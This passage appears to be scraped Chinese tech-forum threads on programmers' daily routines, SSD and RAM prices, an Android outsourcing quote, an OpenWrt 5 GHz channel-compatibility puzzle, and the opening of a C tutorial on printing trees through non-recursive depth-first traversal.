）：\n又开需求会你们想清楚了再开啊</p>\n<p>咦前端的妹子挺漂亮啊</p>\n<p>我去技术支持又拉我处理问题了</p>\n<p>这需求怎么回事压根走不通啊上线肯定一堆问题</p>\n<p>这首歌不错诶赶紧收藏</p>\n<p>这需求这么急那就先缓一缓吧反正肯定得延期</p>\n<p>刚毕业的这小伙挺强啊多给他点任务锻炼锻炼吧</p>\n<p>啊咧线上这功能怎么这么难用先记下来后面改</p>\n<p>来来来赶紧临传个</p>\n<p>我靠我的功能被人合并解决冲突时干掉了</p>\n<p>脑袋乱了出去溜达溜达吧</p>\n<p>什么？压测又没通过？</p>\n<p>啥？又要搞培训？</p>\n<p>咋？需求又大改了？</p>\n<p>思考构思流程图脑图</p>\n<p>敲敲敲，码码码</p>\n<p>电脑咋又卡住了呢</p>\n<p>今天谁加班谁是孙子</p>\n<p>哎这孙子今天又当定了…</p>\n<p>不断的给自己挖坑、填坑、挖坑、填坑…然后结束这一天。</p>\n<p>那各位的日常都是怎么样的呢？</p>\n</div></div>"], "reply": "50", "tittle": "在西二旗工作的程序员们日常都是怎么样的？", "comment": ["😄", " ~(╯﹏╰)b", "上午瞎逛 V2 B 站 下午玩 CSGO 傍晚开始敲敲敲", "新媒体行业，俺都不知道每天自己看新闻是在工作还是在休闲。\r", "9 点前到公司， 6 点过就能下班。与敲代码不同的是，敲的是文字。每周 7-8 篇就结束了。\r", "写的就是科技行业的各个公司以及他们的产品\\技术。", "已经发呆到现在了.....\r", "\r", "\r", " 在公司怼 CSGO???", "你们程序员的工作强度跟我们工程师这行比算低的了，结果还成天吐槽加班。。", "  程序员和工程师区别是什么？", "住在 G6G7 中间，每天从西二旗坐车，正好我进站的时候，进出 3 、 7 开，而我出站的时候基本全是进站的。", "架构师半夜在打守望先锋。别问我怎么知道的。", "哈哈哈，生活真丰富", "西二旗这交通真是影响了中国互联网的发展。估计里面几十万人吧，每天耗费在园区堵车上面人均 40 分钟妥妥的", " 看新闻也是工作的一部分", "基本差不多吧。空闲时间都被自己填补了", "卧槽，你们都不专心啊？😂", "没有规划好，路太窄", "基本差不多，不过是在望京搬砖的", " #3 哈哈 同 v2 B 站来回逛", "一般九点到十点应该在路上堵着..", "在西二旗呆了三年...亲自见证了附近几家店面倒闭新开倒闭新开,打赌西少爷今年关门.", "过了过了  😂", "吃饭  睡觉  撸管  编码", "确实 13 号线是互联网行业从业者的专车，不只是你说的西边，还有东边望京，这边有美团， 58 ，阿里巴巴，奇虎等等", "hhhhh 笑死了", "早 8 点，西二旗地铁的人啊，觉得中国真的不缺工程师", " = =确实，有些传统工程师职位可以算是体力活，维修的，画图纸的，而且有点最坑的是，传统岗没有 github 和 stackoverflow ，有问题有时真的没法通过参考别人的经验解决", "  感觉西少爷口味还行，为啥觉得会倒闭？", " 噗，朋友你加班得到几点？", " 啊啊啊啊啊，握爪握爪。我也是苦逼运营喵...哈哈可留联系方式交流？（ hfsl846561355 ）", " 程序员与你们工程师？？？？", " 真的不累？", " 西少爷性价比低，而且口味改良的有点过头了。吃过正宗潼关肉夹馍后很难接受西少爷的价格和口味。", " 贵啊...而且我个人觉得不好吃,甚至还不如某路边摊的肉夹馍", " \r", " \r", "\r", "西少爷那种恶俗营销就挺反感的。", " 在家工作\r", " 厉害了 有时候撸代码还在 B 站直播\r", " 自由职业 嘿嘿嘿", " 发现 LZ 竟然是妹子~这儿可是狼多呢", "你们都住哪个方位，上下班多少时间哦。准备近期搬砖...", "所以我马上搬唐家岭新城去住了　可以步行上班了", "下班真早啊", "3:20PM 起床刷牙洗脸\r", "3:30PM 骑车去公司\r", "4:00PM 打卡\r", "5:00PM 吃饭\r", "5:30PM 刷新闻 视频 接收资讯\r", "6:00 ～ 8:00PM 巡检服务器 看日志 检查数据库 备份\r", "～ 11:59PM 睡觉\r", "00:00 下班\r", "00.30 到家洗澡 然后玩玩游戏 睡觉\r", "\r", "运维狗的一天", "写实", "居然无法反驳……", "住的地方能看到后厂村路，从七点就特别堵了", " 深有感触啊，之前在沙河住，工作在五道口，大概得坐 40 分钟到一小时，坑啊。上地铁都是被挤上去的", " 同望京搬砖", " 哦吼吼，被你发现了~", " 这个工作时间...", "你要是在生命科学园上地铁就能体验脚不着地腾空的感觉。这个 feel 倍爽。", " 为什么你的一天是从下午 3 点开始的，兄弟。。。", " 而且我们属于直接给政府工作，朝令夕改兼顾工期，资金额太大的东西受的约束太大了，处处被监管", " @", " 我是夜班"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h3>近期换笔记本是不是不太划算， SSD 和内存年中（ 6 月左右）价格会不会稍稍回落。</h3>\n<h3>之前也看过价格的分析，现在来问问要不要等 4 个月，还是早买早轻松。</h3>\n<h3>另 5-6K （包扩展 SSD/内存）求方案（让我左转贴吧的话还是不浪费您铜币了 TAT ），打算战神系列，求劝退。</h3>\n<h3>用途：敲代码（感觉用游戏本敲代码什么的比较爽）</h3>\n<h3>要求： 8G 256SSD</h3>\n</div></div>", "<div class=\"topic_content\">打算入吧商的 z6-kp7s1 ，有没有劝退的，比如等狗东降回原价。</div>"], "reply": "97", "tittle": "近期换笔记本， SSD 和内存是不是不太划算？", "comment": ["现在买固态硬盘真的很不划算。", "内存也不划算", "不急的话 ", "建议你 ", "等一下", "我也在等", " TAT 等的好苦，看来电脑也是等等比较好。", "内存不知道，固态的确是。( ̀⌄ ́)\r", "举个栗子： ", " \r", "\r", "去年过年 269 入的，用了一年，现在转手还有赚", " 我 15 年双 12 也是，但是不知道今年会不会一直不跌。", "台湾内存大厂南亚的总裁李培英指出，因为全球供应短缺， DRAM 内存的价格会在 2017 年上半年持续快速增长，包括南亚自己，第三季度才可能会稳定下来。", "2016.6.18 撸到了金士顿当时新产品线 UV400 的 240G 才 348\r", "现在 UV400 的 120G 的 349,240G 要 559", "年前就打算给笔记本加 ssd 和内存了。\r", "刚刚打开狗东一看价格。。。\r", "我也只好等了。", " 大佬大佬，我刚刚提前两站买成功了，到时候去人工取票 :P", " 就喜欢你这种干货\r", "\r", " 心疼自己心疼你", "京东 518 购买的惠普暗影精灵 2 代， 6999 版本减一千。可以等多三月", " 狗东黑号不说话。。。", "内存、 SSD 都在涨价。还好我在双 11 的时候买齐了。", "后悔去年 618 时没囤一波，现在想升级机子要等了…", "“ SSD 和内存年中（ 6 月左右）价格会不会稍稍回落”\r", "---\r", "你如果是做笔记本生意的，关心这个还说得过去。但你只是买个笔记本啊，关心这个也要考虑一下自己的时间成本啊。", "内存产品都涨了一倍，这三棒子要逼死人，幸好我 ssd 和内存都是之前买的，否则要哭死", " 感觉太亏的话自己是可以忍忍的。\r", "\r", " +1", "眼瞅着内存条的价格噌噌往上窜", "我 12 年买内存时， 8G 是两百多元；我如果现在卖二手，都不好意思卖这市场价格。\r", "价格肯定会跌，跌最厉害的时候应该要再过 2~3 年， 3D NAND 普及和国内厂商上下游打通（看紫光砸钱的程度）。", "我 6 月京东上买了 2 个 8G ddr3 笔记本条 189RMB/条，现在卖二手价格还能有赚。。。\r", "SSD 就不说了，现在主流都是 TLC ，当初 MLV 同容量都比现在便宜。", "都怪该死的三爽 。。。。。", "两年前买的东芝 128g 年前保修说停产了 换了个型号 256 ，  赚了 200 多   XD", "喜欢就买 不行就离 重启试试", "除了你说的,我还想换个显示器,显示器过一段时间会不会降价", "两年前黑五， 16G ddr3L 52 刀，那时候还是 6.2", " 真正的好货只会越卖越少，现在市面上的显示器，放眼望去全是 WLED 背光和低端 IPS 。", "转了一圈下来还是觉得神船性价比高一点", "CHH 上面的人说降下来要很久，起码第三季度甚至更久，参考发大水时的硬盘价格要多久才恢复。", " 可怕！！", " 我也觉得", " 我也买了但是现在是整机换不打算拆原来的电脑", "内存 299->499 ，真疯狂。\r", "机械硬盘稳定，希捷 2T 15 年 459 ， 16 年 429 ， 17 年 499 。\r", "SSD 3 年前 256G 记得近 800 ，现在 5-600 ，相对降了很多。", " 3 年前。。我 15 年 128g 才 259", " \r", "\r", "SSD 现在都是 TLC 了，不便宜没天理。\r", "\r", "PS ：见过 2000 年内存一天 100 的涨幅，现在的内存上涨都不是事～", " 对，我之前买的闪迪现在只有 tlc 了，而且贵辣么多", " 求推荐个 1000 左右的显示器,现在的显示器看着眼疼,不玩游戏", " 下面两个帖子供你参考：\r", "\r", "\r", "\r", "\r", "你一定要买新的，看看 BenQ 和 ASUS 的 MVA 或者 TN 面板，背光现在只有 LED 背光了，优选直流 DC 调光，次选高频 PWM 调光。", " 谢谢了", "我最近看上了 yoga4pro ， 6700 多", "\r", " 老哥这个如何? DR 调光,AMVA+面板,性价比如何", "怎么不买苹果笔记本？", " 何不食肉糜？？", "难，再真正掉下去估计得 1 年起，两年也正常，到时候 ddr4 高频条估计都普及了", "戴尔燃 7000 吧，内存和 SSD 都可以扩展", "放心，等内存颗粒我朝做起来，去解救水深火热的群众", " 拒绝 dell=。=\r", "\r", "\r", " 等。。。。", "z7m-kp7s1?", "京东 6200 左右,找渠道商 5500", " ok ， thx 渠道商指吧商吗", " 显卡对我来说太浪费了，不过 8G 256 还是很好，不知道有没有其他不变然后显卡低个档次，或者大概告诉我怎么查。。谢谢了", "买了 macbookpro ，手头有 SanDisk Extreme Pro 240G ，质保十年箱说全\r", "有没有意思的？", " \r", "不是吧商,是本地实体店货源的经销商.\r", "京东列表页可以选择主要配置,至少内存和硬盘都是有选项的,按价格排序一个个点进去看看详细配置", " 点错旗舰店了。 2333 。 never mind", " 吧商不建议吗，感觉你说的有点麻烦，都不知道怎么联系", " 都差不多的，建议你上网找找这些显示器的拆机图片看看，一般内部做工和用料给大厂 OEM 要比自己零售好得多。", "可以买带 2 个 m2 接口的笔记本，先买个便宜的 M2 TLC SSD 先用着，过一段时间 SSD 降价了再买个好的大容量的 M2 SSD 。", "没啥可以等的，不会降价。这些东西都是进口货，商家定的价格都是基于美刀。", "那个，讲真你这个头像真让我受不鸟 看见就想点", "买个普通的本，拆光驱放固态", " 这种很少吧，有具体推荐吗", " 怪我咯，我干嘛不直接买 m2 的固态。。性能还好些", " 好吧，谢谢提醒", "是的,我买了个 16G 内存.ssd 直接用旧的了", "年前买 250G 的 SSD,下单后的 5 分钟,涨了 100 多,还好卖家发货了", "神船 z7m 系列可以考虑一下，但好像超了一点点预算，里面有带一个 m2 的硬盘位，可以自己加硬盘，内存貌似支持到 32G 吧", "蜂鸟", "看了订单记录, 15 年 12 月买的 128g ssd 现在居然涨了 90 块!!!", " 我也是 15 年双 12 啊，涨了 100 多而且颗粒还变差了", "如果可以忍受机械硬盘的话.....", "问个问题…… 笔记本也是自己组装的吗？", "16 年九月三星 850 579 入手，到双十二活动价 699", " 属于回不去系列", " 不是啊。只是加内存固态而已", "不得不说，早买早享受。。", "东芝  mlc   256  买这个不就好了？？", "建兴还不错 16 年 3 月在狗东自营买的 T9 256 448 元 现在绝版了😂 狗东没有了 某宝上卖 600 多。。。感觉赚了😂", "去年 618 屯了两根金士顿 8GB 内存，才 199 。 intel 535 ssd 最低才 299 多，后悔没多屯点", "回落困难，物料价格上涨，软妹币贬值中。。。。。", "现在的价格感人啊 最低的时候 399 的内存条干到 999 我内心那个翻滚不知道怎么说。\r", "感觉价格还能降回去吧。只是时间问题，幸好需求不是那么刚。", "等。\r", "幸好 618 攒了一台", " 618 时， 1399 的至尊超极速，降价到 799 ，抢了 5 块，然后一分不赚，转手了。还剩一块留着，自己不舍得用，出掉又不舍得，哈哈，压箱底呢。\r", "哈哈，都是冲动", "接楼上，是 699 ，不是 799", "有$想換就換吧, 我是因為沒$ 128g & 8g ram macbook air 割雙系統還是免強的使用中,,,,.", "1 年多前买了个 intel 730 ， 1500rmb ，半年前又买了一个一样的， 1700rmb ，现在再看，尼玛 1900rmb 了", "SSD 海淘闪迪还可以，比国内便宜多了，还有全球联保，刚买的 960GB 的 1300 左右。\r", "内存是真坑，半年前京东买的单条 16GB 的 500 多，现在同型号已经 999 了。", " 1T 的 SSD 买不起啊 233333333", "早买早享受", "假设换 SSD 和大内存每天给你带来的效用相当于一块钱，那么等待三个月你就损失了 100 块。\r", "考虑一下 SSD 和内存降价有没有这么快？", "正好想组个机器 现在是买不起了", " 你自己用个一年转手还是有赚的 2333333333333", "多买两条，等涨价了卖了", " 用过的一般别人不敢接吧", " 你去 ", " 发个贴试试，秒出（夸张点）", "内存比去年中贵一倍 \r", "double price~\r", "\r", "固态略贵，但不是很夸张。个人估计：+15%\r", "去欧美亚买带折扣的比较划算", " 内存不止一倍...6 月某东买了两条芝奇 Ripjaws D4 8G ， 179 一条...11 月又买了两条，券后价 309....今天价格是 429....", " #87 那我要出也要先把我机器上这块出掉，然后自己用这块新的", "翻倍了，不能买", "确实，我去年 4 月份买了一个 120G 的三星 EVO750SSD289 ，自己做了个移动硬盘。 12 月份，在闲鱼上卖掉了，卖了 300 元😂不过我还是厚道的包邮了，数码产品就是早买早用。毕竟敲代码爽是最重要的", " @", " @", " @", " 上船了， 8g 256 自带了", "早买早享受,晚买有折扣.\r", "刚需必须买.\r", "非刚需等等看.", "现在的 SSD 和内存好贵，完全搞不懂 (ﾟｰﾟ)", "如果等，可能要等到年底。", " 大佬我换两个月了。"]},
{"content": ["<div class=\"topic_content\">APP 性质：社交、社区类\r<br>\r<br>大致开发内容：\r<br>全新的活动列表（重做）\r<br>一个活动详情页面的修改（重做）\r<br>首页信息流重新修改布局\r<br>\r<br>大家觉得多长时间跟多少钱可以做？有兴趣的能留个邮箱吗？\r<br>\r<br>项目比较紧，不压价，按市场价走，最好坐标深圳</div>"], "reply": "32", "tittle": "这工作量大概需要多长时间、RMB（安卓二次开发）", "comment": ["你这说了当没说好吗", "1L + 1 你这信息量有点少\r", "\r", "还就是我个人比较喜欢按行数来评估工作量", "如果有需求界面还好说，而且还得看那个界面要处理的交互逻辑多不多", "效果图，流程图，需求文档。小白觉得这些应该是要的吧。", " 是故意往简单的写的，需求、文档、流程图这些都是有的，方便的话能发个简历过来吗？我们觉得 OK 的话约个时间具体谈： Y29tMmNvbkBnbWFpbC5jb20=", " 这些都有的，只是没说的那么详细，也不知道这里准不准发。。。", "能留个联系方式吗？", "你可以把响应资料整理放在共享网盘里，有兴趣的人自然会仔细查阅。", " 有道理，我现在放上去，谢谢", " Y29tMmNvbkBnbWFpbC5jb20=", " 这是什么？", "\r", "\r", "都跑上来问人了，就给点意思，什么都不放，光想坑人压价还怕小白白撞。有意思？", " 有个需求文档的话我可以考虑下是否能接", " 一言不合就要发简历吗？", " 那是他的邮箱", " ", " 这是大致的需求文档", " ", " 这个是大致的需求文档", " 不太明白你的意思，我们需要熟手，新手还是算了，宁愿给多点钱", " 大致需求放上去了： ", "感觉也不是太难。", "别的都还好，就怕开苞有惊喜。我被惊喜 n 回过。", " 这个我觉得可以现场看看代码结构吧", " 还行，很简单，但是确实就是怕代码坑。。如果要开发，接口之类的有文档的吗。", "感觉页面不全啊，想去和我要约人的页面没有，还有 lbs 不知道是已经接好了还是没接，有点想接但是没简历┑(￣Д ￣)┍", " 接口有文档的，代码你可以面谈的时候看看质量吧", " 我要约人链接到发布活动页面，已经做好了的，想去的话就是弹窗发布一条类似广播的东西，我们不接 LBS ，需要位置的地方都是做好的了。你是学生吗还是？", " 不是学生，只是想赚点零花钱，但是没结果外包，而且也不在深圳", " 有兴趣，是否有人接了？", "  联系你了", " 还没有，能发些做过的产品或者能证明你的技术水平的信息吗？", " 加你 QQ ，我在深圳的，可以见面详聊。", "代码结构是屎的话。。我想需要花很大很大精力。。。"]},
{"content": ["<div class=\"topic_content\">前两天一个 V 友要购买我的闲置 WNDR3800\r<br>闲置 N 个月，回家重新刷一个干净的 OPENWRT 并恢复出厂设置测试是否有问题，发现一个奇葩问题：\r<br>有些设备找不到他的 5G WIFI\r<br>iPad 能找到，小米盒子能找到，iPhone找得到\r<br>三个小米手机找不到，红米找不到，华为 Mate8 找不到\r<br>家里还有俩路由器，作为 client 模式一个能找到\r<br>一个找不到\r<br>\r<br>能找到的都通信正常速度飞快无任何问题，找不到的手动输入也连不上\r<br>\r<br>折腾了三五天终于找到了原因，现开始竞猜，看看谁猜得到</div>"], "reply": "66", "tittle": "一个 5G WIFI 的奇葩问题 竞猜", "comment": ["要么信道，要么地区。", "猜不出来啊\r", "信道吗", "路由器 5G WIFI 的频率设置得太高了？", "信道问题吧～", "我昨晚把极路由 3 刷成 openwrt 了， iphone 死活找不到网络，最后把协议那里改了就好了，就是标注 ac an 什么的那里", "我猜信道问题", "#3 楼正解？", "把信道设到国区范围就好了", "之前在日买的 surface 就是连不上家里的 5g 网，路由器地区设成 jp 就好了，不同地区 5g 的频率不一样吧", "等答案, 麻烦 LZ@ 一下", "信道  有些手机除了 1,6,11 其他的都不认", "我的路由器刷了之后也是这个情况", "折腾了三五天才搞定，那肯定不是什么信道之类的问题了吧\r", "楼主别卖关子了，直接说吧", " 这个问题我遇到过，可能是固件兼容性问题，我之前用 netgear r6300v3 刷了 openwrt ，然后路由器就在电脑旁边都很弱的信号，后来刷了 ddwrt 就信号很好了", " #10 \r", "\r", " #13 \r", "肯定是信道原因\r", "但是产生的原因比较有意思。\r", "\r", "在未确定国家的情况下， openwrt 选择的默认国家和 auto 信道并不是从一个兼容性最好的出发，比如首选 149 ，他会经常选择一个大多数国家都不支持的信道\r", "\r", "而这个一般情况下根本看不出来 而在 2.4G 就比较明确，如果你选择了默认的 auto ，即使有 13 信道和 12 信道，默认的 auto 也不会去选用这俩信道\r", "\r", "5GHz 的信道太多，还有小号和大号两个区，平时根本背不下来哪些信道咋回事，折腾了 N 天，直到怀疑信道有问题，手动选择了一个 149 信道（历史上貌似某个路由不带 auto 默认是这个信道看起来眼熟有印象） 一切回归正常\r", "\r", "真的没想到，很多客户端设备还真的遵循国家规范只支持一部分 wifi 信道……", "很多设备不支持 5G wifi 嘛  红米低端机现在支持 5Gwifi?\r", " #16 \r", "反正我的红米支持……", "少见而多怪了，合法的设备不敢随便违反国家规范的", " #18 \r", "那你说小米盒子和小米手机哪个不科学了？", "2.4G 的时候知道 11 信号以上，某些手机、电脑就搜索不到信号了\r", "5G 应该也是类似原因", " 不是故意只支持一部分，只不过有相当大一部分频率是后批准的。 149 以上信道兼容性为佳。\r", "信道", " #21 \r", "具体问题我明白的，中国的 5G 合法信道要少\r", "但是实际上，这个东西是软件定义的，硬件都是标准件\r", "2.4G 时代美国的客户端也是能兼容 13 信道的， FCC 那么严的规定下\r", "在客户端锁这个真没想到 而且 openwrt 没有使用一个通用信道作为 auto 才是本质大坑", " \r", "英国版的 pixel 经常连不到（国内） 5G 的 WiFi", "这个问题之前就有过类似的说法，许多路由器为了增强 5G 信号强度改国家地区为澳大利亚之类的，教程中都特地提到一定要手动指定信道为 149 。否则设备很可能不兼容，甚至会影响邻居家的 5G 信号（关于后者网友也吵得很厉害，我没有条件进行过测试）。", "手机不支持 5g", "我记得红米不支持 5G", " note 支持最高的 pro 没有 5g", "国内用 161 比较好，传输距离很远很多", "看了维基百科，国内允许的是 36 ， 38 ， 40 ， 42 ， 44 ， 46 ， 48 ， 149 ， 153 ， 157 ， 161 ， 165 信道， 52 ， 56 ， 60 ， 64 信道必须带 DFS/TPC 支持，防止干扰雷达之类的设备。", "客户端不支持 802.11ac", " 同样英国版的，目前没碰上过连不上的 5G", "忽然想起来，我的 WP 手机也是只有设置 149 信道才能找到 5GHz 热点的\r", "\r", "记得是在恩山的哪个帖子里有说过来着", "信道", "话说手机只支持一部分 5g wifi 信道\r", "\r", "是根据机器的选择的国家来的还是限定死了只支持某个国家？", "除了上面说的信道，还有一个坑可能是 DHCP 的问题。", " 这两不是一样的吗", " 搜不到信号，关 dhcp 毛事，又不是连不上。", " 嗯，找不到信号，确实与 DHCP 无关", "红米 手机不支持 5g 吧", " \r", " \r", "手持红米 4 表示支持 5GHz 无线网络", "5g 信道问题。设成终端支持的固定信道就 ok 。", "信道+1", "中国手机入网许可都要经过泰尔实验室检测，所以信道肯定是遵守国家规定的。至于盒子就不清楚了。", " #15 我买的港版手机也有这问题，信道设置的和国行一样", "信道，地区", "原来如此 学习了。", "Android 机装个 Wi-Fi 扫描仪扫一下附近的 5G 信号你就明白了", "国家政策也有新有旧，从 2013 年起，又开放了一些信道\r", "倒是碰上过 5Mhz 10Mhz 的 WiFi 网络   99%的设备不支持    但跟 3800 没关系", "路由器是美版的，信道的问题，我刚遇到过", "锁区了， 调整一下 信道吧", "猜都不用猜就知道是信道原因", "这款设备的 5G 是 an 吧，不是 ac", "有的是硬件不支持吧", " 硬件当然都是支持的，只不过有些设备在某些方面指标可能会有问题。客户端当然要兼容的，难道你在美国买的笔记本到其它国家就不能用了吗？ openwrt 也是按标准来做的，国家代码为 CN 的情况下，既然 36-48 是可以用的， auto 当然有可能会选这些，一点问题都没有。要怪也只能怪那些客户端太老或偷工减料。", "手机不支持", "楼主，不支持 wifi 5G 的应该是设备的上网本身就不支持吧。通常这些都是低端设备。\r", "\r", "不知道我猜中了没有。至少我这里是这个样子。", " #57 \r", "第一次在 V2 感到我的智商收到了侮辱", "结果发现路由器是北美版的（逃", " #57 审题之差，旷古绝今，闭着眼都知道华为 Mate8 不能是低端设备吧", "一看就知道是信道问题，我之前在家就是这样，荣耀 7 可以成功搜索并连接 5GWIFI ， n5 有的是搜索不到 5GWIFI 或者搜索到但是却不能连接，弄了半天弄不好，后来发现是信道问题。", "一直有发现这个问题，就是不知道原因，我还以为手机收到的 wifi 弱，搜不到家里的 wifi", "学习了 mark 一下", "不光是信道,不同国家最大发射功率还有不同的,比如 OpenWRT 设为 CN,功率 AUTO 比较一下.\r", "不省电的做法是锁定功率,省电的做法是改为 US,然后锁信道.\r", "国内后面通过的几个 5G 信道标准,部分国内设备,甚至刷了 CM 的 N5 国际版都很差.", " 在天朝， 2.4Ghz 的路由器最大发射功率是 100mW.5Ghz 的最大发射功率就不知道了", " 我还以为我妈的红米 3x 不支持 5G 呢，原来是我路由器信道设置问题"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>这是一篇讲究套路的数据结构实战教学文，阅读需要约 20 分钟。</p>\n<p>先来回答三个问题。</p>\n<h2>为什么要打印树形结构</h2>\n<p>树形结构是算法里很常见的一种数据结构，从二叉树到多叉树，还有很多变种。很多涉及到算法的工作，就需要程序员自己手动实现树形结构，但出于结构本身复杂性，不太容易做对，需要一种调试工具来检测正确性。一般的调试手段无非就是加打印， GDB 上断点，写测试用例等，但这些局部以及外部的调试信息对于数据结构的整体把握提供的帮助十分有限，经验不足的程序员甚至可能会迷失在一大片调试信息的汪洋大海中找不着北。理解算法本身是一回事，自己动手是另一回事了，这跟我们理解算法的思维方式有关——对于数据结构而言，我们的感知是形象化的，比方脑海中自动出现一幅图，动态的插入删除，每个节点是如何变动的，平衡的时候局部是怎么旋转的等等，对智力正常的人来说不是什么难事。但对机器来说，它要面对的是只是一堆基于状态的指令而已，将人的形象思维转化为状态机，本身是一件艰难的工作，因为我们很难感知并存储这么多状态，这就需要工具来辅助，最好是画出整个形状结构，以直观地提醒我们哪里出错了，所谓**“观其形，见其义”**。</p>\n<p>我们知道 Linux 有个 tree 命令用来打印树状目录列表，可以将某个目录下的所有文件和子目录一览无遗，非常直观，本文可以说就是为了实现这个效果，并给出源码实现。</p>\n<h2>为什么用深度优先遍历</h2>\n<p>主要是方便输出。在终端输出一般都是从左至右，从上到下，对于树形结构来说，前者自然表达的是从根节点到叶子节点，后者自然表达的是相邻分支，<strong>深度优先遍历符合输出次序。</strong></p>\n<p>实际上广度优先遍历实现起来更简单，只要在每一层左端建立一个链表头，将同一层的节点横向串联起来，从上到下遍历链表头数组就可以了。但考虑以下几点：</p>\n<ul>\n<li>我们的屏幕没有这么宽，足以容纳整棵树，而且我们更趋向于纵向滚动浏览；</li>\n<li>层次关系很难表示，光实现对齐就很麻烦；</li>\n<li>每个节点需要维护一个额外 next 指针，如果这不是数据结构本身所需要的成员，对于存储空间来说是个额外的负担。</li>\n</ul>\n<p>这也说明深度优先遍历第二个优点，它的实现对于数据结构本身是<strong>非侵入式</strong>的。</p>\n<h2>为什么使用非递归遍历</h2>\n<p>其实这是一个见仁见智的问题。递归还是非递归，不过是两种不同的遍历形式，不存在绝对的优劣，而且一般情况下可以相互补充。我个人选择非递归出于以下几种因素：</p>\n<ul>\n<li>避免树层次过多导致函数调用堆栈溢出；</li>\n<li>避免 C 语言函数调用开销；</li>\n<li>所有状态可见可控。</li>\n</ul>\n<p>当然以上因素并不重要，开心就好。</p>\n<h2>一切皆套路，不变应万变</h2>\n<p>既然本文讲究套路，那么干脆现在就把套路给出来好了，伪代码形式：</p>\n<pre><code>/* log 对象 */\ntypedef struct node_backlog {\n    node 指针;\n    回溯点位置（索引）;\n};\n\n/* Dump */\nvoid dump(tree) {\n    从根节点开始迭代;\n    初始化 log 堆栈;\n    for (; ;) {\n        if (节点指针为空) {\n            从 log 对象中获取回溯点位置;\n            if (不存在，或无效的回溯点) {\n                压栈空节点指针;\n            } else {\n                压栈当前节点指针，同时记录下一个回溯点位置;\n            }\n            if (回溯点位置索引为 0) {\n                输出层次缩进、画路径，打印节点内容;\n            }\n            进入下一层;\n        } else {\n            if (log 堆栈为空) return;\n            弹出 log 对象，获取最近记录的节点指针;\n        }\n    }\n}\n</code></pre>\n<p>简单吧？而且我敢说，<strong>这个套路对于所有树形结构都是通用的，只要能够深度遍历。</strong></p>\n<p>不信我给出三个实战例子。</p>\n<h2>目录树或字典树</h2>\n<p>代码在<a href=\"https://gist.github.com/begeekmyfriend/431fd388e74b9c698b4a\" rel=\"nofollow\">gist</a>。这是个 MIB 树，是管理网络节点（设备）用的。简要地讲，它具有两重特性：</p>\n<ul>\n<li>节点之间的层次嵌套关系，决定了它属于目录层次结构；</li>\n<li>节点的 key 具有公共前缀，使得它也类似于（或可用于）字典结构。</li>\n</ul>\n<p>我们不需要关心其 CRUD 实现，只需要知道有一棵现成的目录树或者字典树，我们如何在终端输出它的形状。</p>\n<pre><code>#define OID_MAX_LEN  64\n\nstruct node_backlog {\n    /* node to be backlogged */\n    struct mib_node *node;\n    /* the backtrack point, next to the orignal sub-index of the node, valid when &gt;= 1, invalid == 0 */\n    int next_sub_idx;\n};\n\nstatic inline void\nnbl_push(struct node_backlog *nbl, struct node_backlog **top, struct node_backlog **bottom) {\n    if (*top - *bottom&lt; OID_MAX_LEN) {\n        (*(*top)++) = *nbl;\n    }\n}\n\nstatic inline struct node_backlog *\nnbl_pop(struct node_backlog **top, struct node_backlog **bottom) {\n    return *top &gt; *bottom? --*top : NULL;\n}\n\nvoid mib_tree_dump(void) {\n    int level = 0;\n    oid_t id = 0;\n    struct mib_node *node = *dummy_root; \n    struct node_backlog nbl, *p_nbl = NULL;\n    struct node_backlog *top, *bottom, nbl_stack[OID_MAX_LEN];\n\n    top = bottom = nbl_stack;\n\n    for (; ;) {\n        if (node != NULL) {\n            /* Fetch the pop-up backlogged node's sub-id. If not backlogged, set 0. */\n            int sub_idx = p_nbl != NULL ? p_nbl-&gt;next_sub_idx : 0;\n            /* Reset backlog for the node has gone deep down */\n            p_nbl = NULL;\n\n            /* Backlog the node */\n            if (is_leaf(node) || sub_idx + 1 &gt;= node-&gt;sub_id_cnt) {\n                nbl.node = NULL;\n                nbl.next_sub_idx = 0;\n            } else {\n                nbl.node = node;\n                nbl.next_sub_idx = sub_idx + 1;\n            }\n            nbl_push(*nbl, *top, *bottom);\n            level++;\n      \n            /* Draw lines as long as sub_idx is the first one */\n            if (sub_idx == 0) {\n                int i;\n                for (i = 1; i &lt; level; i++) {\n                    if (i == level - 1) {\n                        printf(\"%-8s\", \"+-------\");\n                    } else {\n                        if (nbl_stack[i - 1].node != NULL) {\n                            printf(\"%-8s\", \"|\");\n                        } else {\n                            printf(\"%-8s\", \" \");\n                        }\n                    }\n                }\n                printf(\"%s(%d)\\n\", node-&gt;name, id);\n            }\n\n            /* Go deep down */\n            id = node-&gt;sub_id[sub_idx];\n            node = node-&gt;sub_ptr[sub_idx];\n        } else {\n            p_nbl = nbl_pop(*top, *bottom);\n            if (p_nbl == NULL) {\n                /* End of traversal */\n                break;\n            }\n            node = p_nbl-&gt;node;\n            level--;\n        }\n    }\n}\n</code></pre>\n<p>代码不算复杂，就讲几个要点：</p>\n<p>深度优先遍历要利用<strong>回溯点</strong>，就是走到一个分支的尽头后，上溯到原先路过的某个位置，从另一个分支继续遍历，如果回溯到根节点，就说明遍历结束了，所以，回溯点是必须要记录的。问题是记录哪个位置呢？以二叉树为例，遍历了左子树后，接下来遍历的就是右子树，所以回溯点是右孩子；对于多叉树，遍历第 N 个分支后，接下来要遍历 N+1 分支，所以回溯点是 N+1 ；如果遍历完最后一个分支，则需要继续上溯寻找回溯点了。所以呢，我们就用 sub_idx + 1 来记录回溯点，我们还可以利用这个属性做个分类，<strong>值大于等于 1 时，回溯点有效，值等于 0 ，回溯点无效。</strong></p>\n<p>关于 log 堆栈操作，这里使用了二级指针的技巧。这个堆栈十分小巧，所以利用函数局部变量做存储也未尝不可，还有不需要对外暴露数据的好处。那么对于堆栈指针，就需要传递二次指针来改变它。比如我们看入栈操作：</p>\n<pre><code>(*(*top)++) = *nbl;\n</code></pre>\n<p>这是将 log 对象拷贝给 top 指向位置，然后将 top 指针上移， top 和 bottom 的差值就是堆栈元素的数目。由于 top 是二级指针，所以被赋值的是**top ，指针移动就是(*top)++。再来看出栈操作：</p>\n<pre><code>return --*top;\n</code></pre>\n<p>先将 top 下移一个单位，然后返回所指向的 log 对象，也就是*top 。</p>\n<p>接下来该深入讲解套路了，首先，根节点设置成了 dummy ，这是一个虚拟节点，是为了保证最上层只有一个节点而使用的编码技巧，好比 tree 命令输出目录树总是从当前目录“.”开始。由于第一次进入循环， log 